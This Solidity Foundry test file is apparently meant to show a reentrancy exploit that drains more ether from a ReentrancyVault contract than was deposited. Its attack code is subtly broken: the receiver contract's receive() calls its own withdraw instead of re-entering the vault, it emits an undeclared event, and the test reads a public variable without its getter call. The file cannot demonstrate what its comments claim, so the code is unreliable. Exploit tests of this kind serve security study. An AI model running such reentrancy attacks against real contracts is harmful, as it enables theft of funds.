// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/ReentrancyVault.sol";

contract ReentrancyVaultTest is BaseTestWithBalanceLog {
    ReentrancyVault target;
    
    function setUp() public {
        super.setUp();
        target = new ReentrancyVault(); // Correctly deploy the contract once
        emit log_address(address(target), "Target address");
    }

    // Execute a reentrancy attack
    function testExploit() public  balanceLog {
        (bool success, ) = payable(address(target)).call{value: 1 ether}("");
        require(success, "Failed to deposit");

        address attacker = createAccountWithBalance(2 ether);
        vm.startPrank(attacker);

        // Deploy a re-entering receiver
        receiver r = new receiver();
        r.initiateReentrancy(payable(address(target)));

        target.withdraw(1 ether); // Call withdraw directly

        assertGt(r.withdrew, 1.99 ether); // Assert more than the original deposit was withdrawn
    }
}

// Re-entering receiver contract
contract receiver {
    uint public withdrew;

    function initiateReentrancy(address payable _target) external {
        (bool success, ) = _target.call{value: 1 ether}("");
        require(success, "Failed to re-enter");
    }

    receive() external payable {
        if (msg.value > 0 && address(this).balance >= msg.value) {
            emit log_uint(withdrew);
            withdraw(msg.value); // Re-enter into the vault
        }
    }

    function withdraw(uint _amount) public {
        require(address(this).balance >= _amount, "Insufficient balance");
        withdrew += _amount;
        payable(msg.sender).transfer(_amount);
    }
}